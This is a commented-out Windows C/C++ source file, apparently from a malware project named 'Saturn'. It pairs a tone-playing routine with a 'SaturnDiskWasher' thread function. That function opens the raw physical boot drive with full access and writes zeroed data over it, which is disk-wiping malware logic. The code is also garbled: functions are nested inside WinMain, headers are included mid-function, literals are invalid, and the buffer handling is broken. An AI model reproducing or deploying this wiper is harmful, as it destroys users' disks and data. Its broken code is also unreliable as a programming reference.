/*
#include "Saturn.h"

INT
WINAPI
WinMain(
	_In_ HINSTANCE hInstance,
	_In_opt_ HINSTANCE hPrevInstance,
	_In_ LPSTR lpCmdLine,
	_In_ INT nShowCmd
) {
	// Beep Sound Playing Code. Reference: https://stackoverflow.com/questions/5814869/playing-an-arbitrary-sound-on-windows

	// Start Of Things To Include In Header File If This Function Is Used.
#define _USE_MATH_DEFINES 1
#include <math.h>
#include <stdio.h>
#include <tchar.h>

#include <windows.h>
#include <mmreg.h>
#include <complex>

#pragma comment(lib, "Winmm.lib")
// End Of Things To Include In Header File If This Function Is Used.

	MMRESULT play(float nSeconds,
		float signal(float timeInSeconds, unsigned short channel, void *context),
		void *context = NULL, unsigned long samplesPerSecond = 48000) {
		UINT timePeriod = 1;

		MMRESULT mmresult = MMSYSERR_NOERROR;
		WAVEFORMATEX waveFormat = {
			0
		};
		waveFormat.cbSize = 0;
		waveFormat.wFormatTag = WAVE_FORMAT_IEEE_FLOAT;
		waveFormat.nChannels = 2;
		waveFormat.nSamplesPerSec = samplesPerSecond;
		const size_t nBuffer =
			(size_t)(nSeconds * waveFormat.nChannels * waveFormat.nSamplesPerSec);
		float *buffer;
		waveFormat.wBitsPerSample = CHAR_BIT * sizeof(buffer[0]);
		waveFormat.nBlockAlign =
			waveFormat.nChannels * waveFormat.wBitsPerSample / CHAR_BIT;
		waveFormat.nAvgBytesPerSec =
			waveFormat.nSamplesPerSec * waveFormat.nBlockAlign;

		buffer = (float *)calloc(nBuffer, sizeof(*buffer));
		__try
		{
			for (size_t i = 0; i < nBuffer; i += waveFormat.nChannels)
				for (unsigned short j = 0; j < waveFormat.nChannels; j++)
					buffer[i + j] = signal((i + j) * nSeconds / nBuffer, j, context);
			HWAVEOUT hWavOut = NULL;
			mmresult = waveOutOpen(&hWavOut, WAVE_MAPPER,
				&waveFormat, NULL, NULL, CALLBACK_NULL);
			if (mmresult == MMSYSERR_NOERROR) {
				__try
				{
					timeBeginPeriod(timePeriod);
					__try
					{
						WAVEHDR hdr = {
							0
						};
						hdr.dwBufferLength =
							(ULONG)(nBuffer * sizeof(buffer[0]));
						hdr.lpData = (LPSTR)&buffer[0];
						mmresult = waveOutPrepareHeader(hWavOut,
							&hdr, sizeof(hdr));
						if (mmresult == MMSYSERR_NOERROR) {
							__try
							{
								ULONG start = GetTickCount();
								mmresult =
									waveOutWrite(hWavOut, &hdr, sizeof(hdr));
								Sleep((ULONG)(1000 * nSeconds
									- (GetTickCount() - start)));
							}
							__finally
							{
								waveOutUnprepareHeader(hWavOut, &hdr, sizeof(hdr));
							}
						}
					}
					__finally {
						timeEndPeriod(timePeriod);
					}
				}
				__finally {
					waveOutClose(hWavOut);
				}
			}
		}
		__finally {
			free(buffer);
		}
		return mmresult;
	}

	// Triangle wave generator
	float triangle(float timeInSeconds, unsigned short channel, void *context) {
		const float frequency = *(const float *)context;
		const float angle = (float)(frequency * 2 * M_PI * timeInSeconds);
		switch (channel) {
		case 0: return (float)asin(sin(angle + 0 * M_PI / 2));
		default: return (float)asin(sin(angle + 1 * M_PI / 2));
		}
	}

	// Pure tone generator
	float pure(float timeInSeconds, unsigned short channel, void *context) {
		const float frequency = *(const float *)context;
		const float angle = (float)(frequency * 2 * M_PI * timeInSeconds);
		switch (channel) {
		case 0: return (float)sin(angle + 0 * M_PI / 2);
		default: return (float)sin(angle + 1 * M_PI / 2);
		}
	}

	// An Example Of Using It.
	play(random() % 30, pure, 1000F); // 'random() % 30' Means 'Random Of 30 Seconds'
	// Continue With Whatever It Wants To Do.

	// SaturnDiskWasher Thread Function Code. Calling It: CreateThread(NULL, 65536, &SaturnDiskWasher, NULL, NULL, NULL);
	DWORD WINAPI SaturnDiskWasher(LPVOID parameter) {
		GET_LENGTH_INFORMATION Diskleninfo = { 0 };
		DWORD bytesreturned = 0;
		HANDLE drive = CreateFile("\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
		DeviceIoControl(drive, IOCTL_DISK_GET_LENGTH_INFO, NULL, 0, &Diskleninfo, sizeof(Diskleninfo), &bytesreturned, (LPOVERLAPPED)NULL);
		DWORD TDiskSize = Diskleninfo.Length.QuadPart;
		DWORD bytewritten = 0;
		HEX ssat = (HEX)LocalAlloc(LMEM_ZEROINIT, 65536);
		ZeroMemory(&ssat, sizeof(ssat));
		WriteFile(drive, ssat, TDiskSize, &bytewritten, (LPOVERLAPPED)NULL);
		ExitThread(0);
	}
} */
